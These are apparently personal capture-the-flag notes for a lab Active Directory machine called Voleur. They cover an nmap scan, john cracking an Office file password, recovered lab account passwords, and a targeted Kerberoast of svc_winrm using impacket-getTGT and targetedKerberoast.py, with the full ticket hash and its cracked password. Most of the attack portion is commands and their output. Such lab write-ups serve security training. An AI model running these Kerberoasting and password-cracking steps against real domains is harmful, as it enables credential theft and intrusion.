
# Enumeration

```
nmap -sC -sV 10.129.3.92 -oA nmap/Voleur
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-11 22:20 -0400
Nmap scan report for 10.129.3.92
Host is up (0.039s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-12 10:20:35Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2222/tcp open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 7h59m58s
| smb2-time: 
|   date: 2026-03-12T10:20:40
|_  start_date: N/A


```


setup nxc

![](../../../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260311223904.png)


1. [https://hashcat.net/wiki/doku.php?id=example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes "https://hashcat.net/wiki/doku.php?id=example_hashes")
see discord mee6 for otherresources

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 128/128 ASIMD 4x / SHA512 128/128 ASIMD 2x AES])
Cost 1 (MS Office version) is 2013 for all loaded hashes
Cost 2 (iteration count) is 100000 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:01 0.00% (ETA: 01:49:54) 0g/s 226.4p/s 226.4c/s 226.4C/s 888888..rebecca
football1        (Access_Review.xlsx)     
1g 0:00:00:03 DONE (2026-03-12 06:55) 0.2840g/s 225.0p/s 225.0c/s 225.0C/s football1..capricorn
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```



![](../../../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260311225931.png)

Todd.Wolfe : NightT1meP1dg3on14
svc_ldap : M1XyC9pW7qT5Vn
svc_iis : N5pXyW1VqM7CZ8


![](../../../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260311232503.png)

ZQJqIiYkrxXXMHp5ow3vz5se3R6E585e

```
sudo rm /usr/local/bin/docker-compose
sudo curl -L https://github.com/docker/compose/releases/download/v5.0.2/docker-compose-linux-aarch64 -o /usr/local/bin/docker-compose
sudo chmod +x /usr/local/bin/docker-compose
docker-compose version
```

http://localhost:8080/ui/explore

admin
ZQJqIiYkrxXXMHp5ow3vz5se3R6E585e


```
uv tool install bloodhound

```


```
                                                                                                                       
┌──(h4ckrati㉿kali)-[~/targetedKerberoast/targetedKerberoast]
└─$ impacket-getTGT 'voleur.htb/svc_ldap:M1XyC9pW7qT5Vn'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_ldap.ccache
                                                                                                                                                             
┌──(h4ckrati㉿kali)-[~/targetedKerberoast/targetedKerberoast]
└─$ export KRB5CCNAME=svc_ldap.ccache
                                                                                                                                                             
┌──(h4ckrati㉿kali)-[~/targetedKerberoast/targetedKerberoast]
└─$ python3 targetedKerberoast.py -d voleur.htb -u svc_ldap --dc-host dc.voleur.htb -k --request-user svc_winrm
[*] Starting kerberoast attacks
[*] Attacking user (svc_winrm)
[+] Printing hash for (svc_winrm)
$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$9797253a00d14ab9ab550d3ce62badbe$043a775f0bd5d5cc4831d1e02684332af7357463fb8a01c74fc3892f494f7767d92776fdfbfabc0fee1c20a7b16c0d13a538e66df65147a3ce23794090e724f5a63d61537f5a28fed41d27d569b97169ca494e746666e190536995ec8f1837d8bcaf003ec153632cba282247f441e5277aa9eb000a20f794fb36de0c4303dc44ffa60823825593d4b533feb5c71f7262d5fece150f014e5a1716ee7d0a0d759a226e4cd3e4a0ff08476e65b0e7b8116c716088cc55ba6fb636bb101e55e4129c4044d7820006b8572ddb1ce690a72eef4b550a32a6e77998612c80127f325652507f9e8061d29628ce6cce77e2e05ffa068032b836a7ed75eb59c9a69c834c6910f3e3d8aa8be4af9f9a85cb11bfeb636cc4073fb3307ce09688df055edc6c7b68e60aa9fb0b5a9146a22a01c739138403c36936edddde1dd0c17eeded3441741bd6f467fa6e9b0cf8d396201ebee9ee9044d05b0b8ed0b0037bda3b97613008f42f1b61ce807db6104d286fefdab4fc9a66f80ec36f44abffa1d1c0c0575284b28866e78c0a02136f600c7ec7f729756edf8b084834d046f4a112e4c1daec669b04eed6a14ed83b97c3afd06633a99d2d133fa48669b676521b6153b2c721cb5b954bd3f3c958afe9d36abcf259ec67ce205db4a52dea4e65d434c870d0a1c103708c681cc27c128c762a66dc203c18f1afa16b4e014d57481fe9e5b0f2b0ea71236d2a691ae67a049f5fff888765fa2cf6524f7530dd165b4f13f7fa3a0efbd5679dc0e9a5772a5ab026f09c90e877fbe03f3accba12d1d52cd3a456c751ad73433e7b45dca6a4f1853d5585cb93c018294cbf8f2eae00c7ebcda9db35a69d0678c6002d53e87b3a67c122332e254fa33aa818d67c628a2c423dc3038f026fd0fad0d2b8214c7197e868f3b866e0693296a68330f436626a2b2c7c70bccc23b5b792dbe7d21deb78fd8ac83896d8ec81de53063e2360fdb3b83e148a29fc695dd220bb2698b0aefd67952e3ea8ce6b2207282b63dbc6b49c3caa8d4b81c2a00e3260a19d37ff5b6343e71b2db7102f1e0802c7abcf219025f642bf4c9f676f1765117b4e434cfb48da888befc8e28e9dd00fc290a3c19b990716c84025e878797013775acfbe24f44e7c171e0ad9bea844975f9239af7f7febbe053464487a3533570778ecd060c9cfa2b1765271c130bb7b72cdd82e7add6368e46a73cf4ab0306497ae3a5223205e895fc4174de015197292c868480bec7414ae8ad1b7419f75e4a535cce31398159904d643afd1a6330d9b1ed215e097e7b77daa6994c8f7fee66c95948631369cafdcc88afd17adb485193c8ef7fc2df37d53667aa0354146d4fb5655403d9595ce41928a04a88f16355c3de0637ab1e75b6737bd38ad03da7237e4bcb7958ae4a7dd5178f664e94c9d243eb98ceabb8884005f559b24ca51bbda5954e180dde5acddcaec8390342275
                                                                                                                                                             
┌──(h4ckrati㉿kali)-[~/targetedKerberoast/targetedKerberoast]
└─$ echo '$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$9797253a00d14ab9ab550d3ce62badbe$043a775f0bd5d5cc4831d1e02684332af7357463fb8a01c74fc3892f494f7767d92776fdfbfabc0fee1c20a7b16c0d13a538e66df65147a3ce23794090e724f5a63d61537f5a28fed41d27d569b97169ca494e746666e190536995ec8f1837d8bcaf003ec153632cba282247f441e5277aa9eb000a20f794fb36de0c4303dc44ffa60823825593d4b533feb5c71f7262d5fece150f014e5a1716ee7d0a0d759a226e4cd3e4a0ff08476e65b0e7b8116c716088cc55ba6fb636bb101e55e4129c4044d7820006b8572ddb1ce690a72eef4b550a32a6e77998612c80127f325652507f9e8061d29628ce6cce77e2e05ffa068032b836a7ed75eb59c9a69c834c6910f3e3d8aa8be4af9f9a85cb11bfeb636cc4073fb3307ce09688df055edc6c7b68e60aa9fb0b5a9146a22a01c739138403c36936edddde1dd0c17eeded3441741bd6f467fa6e9b0cf8d396201ebee9ee9044d05b0b8ed0b0037bda3b97613008f42f1b61ce807db6104d286fefdab4fc9a66f80ec36f44abffa1d1c0c0575284b28866e78c0a02136f600c7ec7f729756edf8b084834d046f4a112e4c1daec669b04eed6a14ed83b97c3afd06633a99d2d133fa48669b676521b6153b2c721cb5b954bd3f3c958afe9d36abcf259ec67ce205db4a52dea4e65d434c870d0a1c103708c681cc27c128c762a66dc203c18f1afa16b4e014d57481fe9e5b0f2b0ea71236d2a691ae67a049f5fff888765fa2cf6524f7530dd165b4f13f7fa3a0efbd5679dc0e9a5772a5ab026f09c90e877fbe03f3accba12d1d52cd3a456c751ad73433e7b45dca6a4f1853d5585cb93c018294cbf8f2eae00c7ebcda9db35a69d0678c6002d53e87b3a67c122332e254fa33aa818d67c628a2c423dc3038f026fd0fad0d2b8214c7197e868f3b866e0693296a68330f436626a2b2c7c70bccc23b5b792dbe7d21deb78fd8ac83896d8ec81de53063e2360fdb3b83e148a29fc695dd220bb2698b0aefd67952e3ea8ce6b2207282b63dbc6b49c3caa8d4b81c2a00e3260a19d37ff5b6343e71b2db7102f1e0802c7abcf219025f642bf4c9f676f1765117b4e434cfb48da888befc8e28e9dd00fc290a3c19b990716c84025e878797013775acfbe24f44e7c171e0ad9bea844975f9239af7f7febbe053464487a3533570778ecd060c9cfa2b1765271c130bb7b72cdd82e7add6368e46a73cf4ab0306497ae3a5223205e895fc4174de015197292c868480bec7414ae8ad1b7419f75e4a535cce31398159904d643afd1a6330d9b1ed215e097e7b77daa6994c8f7fee66c95948631369cafdcc88afd17adb485193c8ef7fc2df37d53667aa0354146d4fb5655403d9595ce41928a04a88f16355c3de0637ab1e75b6737bd38ad03da7237e4bcb7958ae4a7dd5178f664e94c9d243eb98ceabb8884005f559b24ca51bbda5954e180dde5acddcaec8390342275' > haah.txt
                                                                                                                                                             
┌──(h4ckrati㉿kali)-[~/targetedKerberoast/targetedKerberoast]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt haah.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
AFireInsidedeOzarctica980219afi (?)     
1g 0:00:00:03 DONE (2026-03-12 08:06) 0.2932g/s 3365Kp/s 3365Kc/s 3365KC/s ANNE03..ABC123ABCa
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```